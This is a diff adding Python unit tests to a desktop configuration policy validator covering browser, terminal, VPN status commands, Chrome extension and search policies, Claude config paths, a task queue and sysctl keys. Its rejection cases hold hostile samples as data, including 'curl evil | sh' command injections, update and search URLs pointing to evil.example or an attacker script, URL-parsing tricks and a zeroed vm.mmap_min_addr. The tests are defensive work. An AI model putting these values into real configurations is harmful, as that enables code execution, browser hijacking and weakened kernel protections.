@@ -175,6 +175,120 @@ class ConfigPolicyTests(unittest.TestCase):
         self.assertEqual(len(found), 2, found)
         self.assertNotIn('SECRET', '\n'.join(found))
 
+    # --- User-level commands, Chrome policy, the queue and vm.mmap_min_addr (the roles check the same at use) ---
+    def test_browser_and_terminal_are_known_commands(self):
+        for content in ['desktop_wm_browser: google-chrome\n', 'desktop_terminal: ghostty\n', 'desktop_terminal: terminal\n',
+                        'desktop_terminal: foot\n']:
+            with self.subTest(content=content):
+                self.assertEqual(self.violations(content), [])
+        for content in ['desktop_wm_browser: "firefox; curl evil | sh"\n', 'desktop_wm_browser: /usr/bin/firefox\n',
+                        'desktop_terminal: "alacritty -e sh -c evil"\n', 'desktop_terminal: /usr/bin/foot\n',
+                        'desktop_terminal: bash\n', 'desktop_terminal: sh\n', 'desktop_terminal: zsh\n',
+                        'desktop_wm_browser: sudo\n', 'desktop_wm_browser: env\n', 'desktop_wm_browser: [firefox]\n']:
+            with self.subTest(content=content):
+                self.assertRejected(content, 'name')
+        self.assertRejected('desktop_wm_browser: [firefox, evil]\n', 'not a list')
+
+    def test_vpn_status_command_is_a_read_only_status_shape(self):
+        for key in ['desktop_i3status_vpns', 'desktop_i3status_vpns_extra']:
+            for command in [['mullvad', 'status'], ['tailscale', 'status', '--json', '--peers=false'], ['netbird', 'status', '-d'], ['wg', 'show', 'wg0'], ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'], ['warp-cli', 'status'], ['openvpn3', 'sessions-list']]:
+                with self.subTest(key=key, command=command):
+                    self.assertEqual(self.violations(yaml.safe_dump({key: [{'name': 'M', 'command': command,
+                                                                            'connected': '^C'}]})), [])
+            for command in [['sh', '-c', 'curl evil | sh'], ['/usr/bin/bash', '-c', 'setsid evil'], ['/tmp/x'], ['env', 'tailscale', 'status'], ['tailscale', 'up'], ['tailscale', 'status', '--web'], ['nmcli', 'connection', 'delete', 'x'], ['nmcli', 'radio', 'wifi', 'off', 'connection', 'show', '--active'], ['wg', 'show', 'x', 'y'], ['/usr/bin/wg', 'show'], ['mullvad', 'status', 'listen'], ['wg', 'show', 'a b']] + [[], 'mullvad status']:
+                with self.subTest(key=key, command=command):
+                    self.assertRejected(yaml.safe_dump({key: [{'name': 'M', 'command': command, 'connected': '^C'}]}),
+                                        'not a read-only VPN status command')
+
+    def test_chrome_policies_are_supported_and_extensions_tracked(self):
+        for key in ['desktop_chrome_policies_enforced', 'desktop_chrome_policies_recommended_extra',
+                    'desktop_chrome_policies_recommended']:
+            for policy in [{'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://clients2.google.com/service/update2/crx']}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'installation_mode': 'force_installed', 'toolbar_pin': 'force_pinned'}, '*': {'installation_mode': 'blocked', 'blocked_permissions': ['debugger']}}}, {'ExtensionInstallAllowlist': ['ddkjiahejlhfcafbddmgiahcphecmpfh']}, {'ExtensionInstallBlocklist': ['*', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'BookmarkBarEnabled': True}]:
+                with self.subTest(key=key, policy=policy):
+                    self.assertEqual(self.violations(yaml.safe_dump({key: policy})), [])
+            for policy in [{'ExtensionInstallForcelist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallForcelist': ['ddkjiahejlhfcafbddmgiahcphecmpfh;https://evil.example/u.xml']}, {'ExtensionSettings': {'*': {'installation_mode': 'allowed', 'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'*': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'*': {'allowed_types': ['extension']}}}, {'ExtensionSettings': {'*': {'install_sources': ['https://evil.example/*']}}}, {'ExtensionSettings': {'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa': {'installation_mode': 'force_installed'}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'runtime_allowed_hosts': ['*://*/*']}}}, {'ExtensionSettings': {'ddkjiahejlhfcafbddmgiahcphecmpfh': {'update_url': 'https://evil.example/u.xml'}}}, {'ExtensionInstallAllowlist': ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}, {'ExtensionInstallAllowlist': ['*']}, {'URLAllowlist': ['*']}]:
+                with self.subTest(key=key, policy=policy):
+                    found = self.violations(yaml.safe_dump({key: policy}))
+                    self.assertTrue(any(key in line for line in found), found)
+
+    def test_extension_lists_only_name_tracked_ids(self):
+        defaults = yaml.safe_load((ROOT / 'roles/desktop/defaults/main.yml').read_text())
+        # the tracked allowlist is the #194 set and nothing more
+        self.assertEqual(sorted(defaults['desktop_chrome_extensions_allowed']),
+                         sorted(e['id'] for e in defaults['desktop_chrome_extensions']))
+        for key in ['desktop_chrome_extensions_extra', 'desktop_chrome_extensions']:
+            with self.subTest(key=key):
+                self.assertEqual(self.violations(yaml.safe_dump({key: [{'id': 'nngceckbapebfimnlniiiahkandclblb'},
+                                                                       {'id': 'fcoeoabgfenejglbffodgkkbkcdhcgfn',
+                                                                        'install': False}]})), [])
+                for entries in [[{'id': 'a' * 32}], [{'id': 'b' * 32, 'install': False}], ['a' * 32], 'x']:
+                    with self.subTest(key=key, entries=entries):
+                        self.assertRejected(yaml.safe_dump({key: entries}), 'desktop_chrome_extensions_allowed')
+        self.assertRejected('desktop_chrome_extensions_allowed: [%s]\n' % ('a' * 32), 'add an extension ID there by PR')
+
+    def test_search_provider_urls_are_exact_tracked_urls(self):
+        for name, value in [('DefaultSearchProviderSearchURL', 'https://www.google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://duckduckgo.com/?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search?{google:RLZ}q={searchTerms}'), ('DefaultSearchProviderAlternateURLs', ['https://www.bing.com/search?q={searchTerms}']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/complete/search?client=chrome&q={searchTerms}'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/')]:
+            with self.subTest(name=name, value=value):
+                self.assertEqual(self.violations(yaml.safe_dump({'desktop_chrome_policies_enforced': {name: value}})), [])
+        for name, value in [('DefaultSearchProviderSearchURL', 'https://script.google.com/macros/s/ATTACKER/exec?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://sites.google.com/view/x?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderSearchURL', 'https://google.com/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com:443/search?q={searchTerms}'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search/../url?q=x'), ('DefaultSearchProviderSearchURL', 'https://evil.example\\@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com\\.evil.example/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://user@www.google.com/search?q=x'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/search#@evil.example'), ('DefaultSearchProviderSearchURL', 'http://www.google.com/search'), ('DefaultSearchProviderSearchURL', ' https://www.google.com/search'), ('DefaultSearchProviderSearchURL', 'https://www.google.com/complete/search?q=x'), ('DefaultSearchProviderAlternateURLs', ['https://www.google.com/search', 'https://evil.example/s']), ('DefaultSearchProviderSuggestURL', 'https://www.google.com/search?q=x'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/?evil=1'), ('DefaultSearchProviderNewTabURL', 'https://www.google.com/url?q=https://evil.example/'), ('DefaultSearchProviderImageURL', 'https://www.google.com/searchbyimage')]:
+            with self.subTest(name=name, value=value):
+                found = self.violations(yaml.safe_dump({'desktop_chrome_policies_enforced': {name: value}}))
+                self.assertTrue(any(name in line for line in found), found)
+        self.assertRejected('desktop_chrome_search_urls: {search: [https://evil.example/]}\n', 'desktop_chrome_search_urls')
+
+    def test_claude_config_dirs_inside_home_outside_the_repo(self):
+        home = str(Path.home())
+        for value in ['%s/.claude' % home, '%s/.claude-work' % home, '%s/.config/claude' % home]:
+            with self.subTest(value=value):
+                self.assertEqual(self.violations('claude_work_config_dir: %s\n' % value), [])
+        for value in ['%s/../x/.claude' % home, '%s/./.claude' % home, '/tmp/.claude', home, str(ROOT),
+                      str(ROOT / 'toolbox/.claude'), '%s/code/project/.claude' % home, '%s/.claude/../x' % home]:
+            for key in ['claude_default_config_dir', 'claude_queue_config_dir', 'claude_runtime_config_dir']:
+                with self.subTest(key=key, value=value):
+                    self.assertRejected('%s: %s\n' % (key, value), repr(key))
+        self.assertRejected('claude_extra_config_dirs: [%s]\n' % str(ROOT / '.claude-x'), 'claude_extra_config_dirs')
+
+    def test_queue_repo_authors_and_sandbox(self):
+        owner = 'claude_sandbox_enabled: true\nclaude_queue_enabled: true\n'
+        self.assertEqual(self.violations(owner + 'claude_queue_repo: DFarrell07/tasks\n'
+                                         'claude_queue_allowed_authors: [dfarrell07]\n'), [])
+        # dotfiles_github_user is config.yml too: it cannot vouch for an attacker's repo or login
+        attacker = owner + 'dotfiles_github_user: attacker\n'
+        self.assertRejected(attacker + 'claude_queue_repo: attacker/tasks\nclaude_queue_allowed_authors: [dfarrell07]\n',
+                            'claude_queue_repo')
+        for name in ['.', '..']:
+            with self.subTest(name=name):
+                self.assertRejected(owner + 'claude_queue_repo: "dfarrell07/%s"\nclaude_queue_allowed_authors: [dfarrell07]\n'
+                                    % name, 'claude_queue_repo')
+        self.assertRejected(attacker + 'claude_queue_repo: dfarrell07/tasks\nclaude_queue_allowed_authors: [attacker]\n',
+                            'claude_queue_allowed_authors')
+        self.assertRejected('claude_queue_enabled: true\nclaude_queue_repo: dfarrell07/t\n'
+                            'claude_queue_allowed_authors: [dfarrell07]\n', 'claude_sandbox_enabled')
+        for key in ['claude_queue_trusted_repo_owners', 'claude_queue_trusted_authors']:
+            with self.subTest(key=key):
+                self.assertRejected('%s: [attacker]\n' % key, repr(key))
+
+    def test_sysctl_keys_are_strict_before_normalization(self):
+        # the template used to strip characters outside [a-zA-Z0-9._-], turning these into the real key
+        for name in ['vm.mmap_min_addr!', ' vm.mmap_min_addr', 'vm.mmap_min_addr ', 'vm.mmap_min_addé', 'vm.mmap_min_addr\u200b', 'kernel.kptr_restrict ', 'kernel.kptr_restrict!', 'Vm.mmap_min_addr', 'vm..mmap_min_addr', 'vm/mmap_min_addr']:
+            for key in ['system_sysctl_extra', 'system_sysctl_extra_additional']:
+                with self.subTest(name=name, key=key):
+                    self.assertRejected(yaml.safe_dump({key: {name: 0}}, allow_unicode=True), 'not a well-formed sysctl key')
+
+    def test_mmap_min_addr_floor(self):
+        self.assertEqual(self.violations('system_sysctl_extra: {vm.mmap_min_addr: 65536}\n'), [])
+        for content in ['system_sysctl_extra: {vm.mmap_min_addr: 0}\n',
+                        'system_sysctl_extra_additional: {"-vm.mmap_min_addr": "4095"}\n',
+                        'system_sysctl_extra: {"--vm.mmap_min_addr": 0}\n',
+                        'system_sysctl_extra: {vm.mmap_min_addr: x}\n']:
+            with self.subTest(content=content):
+                self.assertRejected(content, 'vm.mmap_min_addr must be at least 4096')
+        # malformed spellings are refused before normalization (test_sysctl_keys_are_strict_before_normalization)
+        for content in ['system_sysctl_extra_additional: {"-vm/mmap_min_addr": "4095"}\n',
+                        'system_sysctl_extra: {vm..mmap_min_addr: 0}\n']:
+            with self.subTest(content=content):
+                self.assertRejected(content, 'not a well-formed sysctl key')
+
     def run_guard(self, config):
         """Run the production guard and pre-flight's config load, then a module."""
         with tempfile.TemporaryDirectory() as directory:
